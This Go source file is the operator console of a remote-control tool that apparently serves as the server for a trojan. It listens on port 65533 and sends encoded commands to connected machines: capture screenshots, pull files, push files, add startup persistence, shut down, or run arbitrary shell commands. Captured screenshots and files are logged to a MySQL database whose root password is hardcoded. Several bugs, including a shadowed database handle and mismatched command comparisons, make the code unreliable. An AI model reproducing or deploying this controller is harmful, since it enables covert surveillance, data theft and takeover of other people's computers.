package main

import (
	"bufio"
	"database/sql"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	_ "io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"sync"
	"time"
)

const (
	WHITE   = "\x1b[37;1m"
	RED     = "\x1b[31;1m"
	GREEN   = "\x1b[32;1m"
	YELLOW  = "\x1b[33;1m"
	BLUE    = "\x1b[34;1m"
	MAGENTA = "\x1b[35;1m"
	CYAN    = "\x1b[36;1m"
	VERSION = "2.5.0"

	USERNAME = "root"
	PASSWORD = "123456"
	NETWORK  = "tcp"
	SERVER   = "127.0.0.1"
	PORT     = 3306
	DATABASE = "yuankong"
)

var (
	khdcount    int                                       //计数客户端数量
	khdconnlist map[int]net.Conn = make(map[int]net.Conn) //储存conn
	khdconnip   map[int]string   = make(map[int]string)   //储存conn的ip

	lock = sync.Mutex{}

	downloadOutName string
	db              *sql.DB //数据库
)

func ReadLine() string {
	buf := bufio.NewReader(os.Stdin)
	lin, _, err := buf.ReadLine()
	if err != nil {
		fmt.Println(RED, "[!] Error to Read Line!")
	}
	return string(lin)
}

//规定当前时间显示方式
func getDateTime() string {
	currrnttime := time.Now()
	return currrnttime.Format("2006-01-02-15-04-05")
}

//心跳计时
func HeartBeat(conn net.Conn, heartchan chan byte, timeout int) {
	select {
	case hc := <-heartchan:
		_ = hc
		conn.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
	}
}

//处理心跳的channel
func HeartChanHandler(n []byte, beatch chan byte) {
	for _, v := range n {
		beatch <- v
	}
	close(beatch)
}

func connection(conn net.Conn) {

	//延迟关闭连接
	defer conn.Close()
	var iid int
	iip := conn.RemoteAddr().String()
	buf := make([]byte, 1024)

	lock.Lock()
	khdcount++
	iid = khdcount
	khdconnlist[khdcount] = conn
	khdconnip[khdcount] = iip
	lock.Unlock()

	fmt.Println(GREEN, "the client: %s ", iip)
	for {

		n, err := conn.Read(buf) //从conn处接收到客户端发送来的信息
		if err != nil {
			conn.Close()
			delete(khdconnlist, iid)
			delete(khdconnip, iid)

			fmt.Println(RED, "客户端退出 err=%v", err)
			break
		}
		message := string(buf)
		switch message {
		case "screenshot":
			data, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(YELLOW, "-->GET screenshot...")
			decData, _ := base64.URLEncoding.DecodeString(data)
			ddecData, _ := base32.HexEncoding.DecodeString(string(decData))
			thefilepath, _ := filepath.Abs("screenshot" + getDateTime() + ".png")

			ioutil.WriteFile(thefilepath, []byte(ddecData), 777)
			sqlstr := "insert INTO jietu(ip,path) values(?,?)"
			result, err := db.Exec(sqlstr, iip, thefilepath)
			_ = result
			if err != nil {
				fmt.Printf("err: %v\n", err)
			}
			fmt.Println(GREEN, "--> The screenshot has been saved to the filename: %s\n", thefilepath)
		case "download":
			data, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Println(YELLOW, "-> Downloading...")

			decData, _ := base64.URLEncoding.DecodeString(data)
			ddecData, _ := base32.HexEncoding.DecodeString(string(decData))

			downFilePath, _ := filepath.Abs(string(downloadOutName) + getDateTime())
			ioutil.WriteFile(downFilePath, []byte(ddecData), 777)
			sqlstr := "insert INTO wenjian(ip,path) values(?,?)"
			result, err := db.Exec(sqlstr, iip, downFilePath)
			_ = result
			if err != nil {
				fmt.Printf("err: %v\n", err)
			}
			fmt.Println(GREEN, "-> Download Done...")

		default:
			fmt.Println(message)
		}
		msg := buf[:n]
		beatch := make(chan byte)
		go HeartBeat(conn, beatch, 30)
		go HeartChanHandler(msg[:1], beatch)

	}

}

func wait() {
	mmysql := fmt.Sprintf("%s:%s@%s(%s:%d)/%s", USERNAME, PASSWORD, NETWORK, SERVER, PORT, DATABASE)
	db, err := sql.Open("mysql", mmysql)
	if err != nil {
		log.Fatal(err)
	}
	err2 := db.Ping()
	if err2 != nil {
		log.Fatal(err2)
	}

	listen, err := net.Listen("tcp", "0.0.0.0:65533") //监听对应ip和端口 0.0.0.0表示接收本地信息  端口为65533
	if err != nil {
		fmt.Println(RED, "listen err=", err)
		return
	}
	defer listen.Close()
	for {

		conn, err := listen.Accept()
		if err != nil {
			log.Fatal(err)
		} //为客户端增加一个协程
		go connection(conn)
	}
}

func ClearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {

	go wait()
	connid := 0
	for {
		fmt.Println(MAGENTA, "SESSION", khdconnip[connid], WHITE, ">")
		command := ReadLine()
		_conn, ok := khdconnlist[connid]

		switch command {
		case "":
		case "guide":
			fmt.Println("")
			fmt.Println(CYAN, "COMMANDS              DESCRIPTION")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println(CYAN, "session             选择客户端")
			fmt.Println(CYAN, "download            下载文件")
			fmt.Println(CYAN, "upload              上传文件")
			fmt.Println(CYAN, "screenshot          远程桌面截图")
			fmt.Println(CYAN, "charset gbk         设置客户端命令行输出编码,gbk是简体中文")
			fmt.Println(CYAN, "clear               清除屏幕")
			fmt.Println(CYAN, "kill                杀掉终端")
			fmt.Println(CYAN, "shutdown            关掉客户端电脑")
			fmt.Println(CYAN, "exit                退出客户端")
			fmt.Println(CYAN, "quit                退出服务端")
			fmt.Println(CYAN, "-------------------------------------------------------")
			fmt.Println("")
		case "session":
			fmt.Println(khdconnlist)
			fmt.Println("选择客户端：")
			input := ReadLine()
			if input != "" {
				var e error
				connid, e = strconv.Atoi(input)
				if e != nil {
					fmt.Println("数字！数字！")
				} else if _, ok := khdconnlist[connid]; ok {
					ccmd := base32.HexEncoding.EncodeToString([]byte("getos"))
					_cmd := base64.URLEncoding.EncodeToString([]byte(ccmd))
					khdconnlist[connid].Write([]byte(_cmd + "\n"))
				}

			}
		case "download":
			if ok {
				ccode := base32.HexEncoding.EncodeToString([]byte("download"))
				code := base64.URLEncoding.EncodeToString([]byte(ccode))
				_conn.Write([]byte(code + "\n"))

				fmt.Print("File Path to download: ")
				pppathdownload := ReadLine()
				fmt.Print("Output name: ")
				downloadOutName = ReadLine()

				ppathdownload := base32.HexEncoding.EncodeToString([]byte(pppathdownload))
				pathdownload := base64.URLEncoding.EncodeToString([]byte(ppathdownload))

				_conn.Write([]byte(pathdownload + "\n"))
				fmt.Print(pathdownload)
			}

		case "upload":
			if ok {
				cccode := "upload"

				ccode := base32.HexEncoding.EncodeToString([]byte(cccode))
				code := base64.URLEncoding.EncodeToString([]byte(ccode))

				_conn.Write([]byte(code + "\n"))

				fmt.Print("File Path to upload: ")
				pathupload := ReadLine()

				fmt.Print("Output name: ")
				uuuuploadOutName := ReadLine()
				uuuploadOutName := uuuuploadOutName + getDateTime() + "\n"
				uuploadOutName := base32.HexEncoding.EncodeToString([]byte(uuuploadOutName))
				uploadOutName := base64.URLEncoding.EncodeToString([]byte(uuploadOutName))
				_conn.Write([]byte(uploadOutName))

				fmt.Println(YELLOW, "-> Uploading...")
				fffile, err := ioutil.ReadFile(pathupload)
				if err != nil {
					fmt.Println(RED, "[!] File not found!")
					break
				}
				ffile := base32.HexEncoding.EncodeToString(fffile)
				file := base64.URLEncoding.EncodeToString([]byte(ffile))
				_conn.Write([]byte(file + "\n"))
				fmt.Println(GREEN, "-> Upload Done...")
			}
		case "screenshot":
			if ok {
				cccode := "screenshot"
				ccode := base32.HexEncoding.EncodeToString([]byte(cccode))
				code := base64.URLEncoding.EncodeToString([]byte(ccode))
				_conn.Write([]byte(code + "\n"))
			}
		case "startup":
			if ok {
				cccode := "startup"
				ccode := base32.HexEncoding.EncodeToString([]byte(cccode))
				code := base64.URLEncoding.EncodeToString([]byte(ccode))
				_conn.Write([]byte(code + "\n"))
			}
		case "clear":
			ClearScreen()
		case "quit":
			os.Exit(0)
		case "exit":
			if ok {
				cccode := "exit"
				ccode := base32.HexEncoding.EncodeToString([]byte(cccode))
				code := base64.URLEncoding.EncodeToString([]byte(ccode))
				_conn.Write([]byte(code + "\n"))
			}
		default:
			if ok {
				cccmd := command
				ccmd := base32.HexEncoding.EncodeToString([]byte(cccmd))
				_cmd := base64.URLEncoding.EncodeToString([]byte(ccmd))
				_conn.Write([]byte(_cmd + "\n"))
			}
		}

	}

}
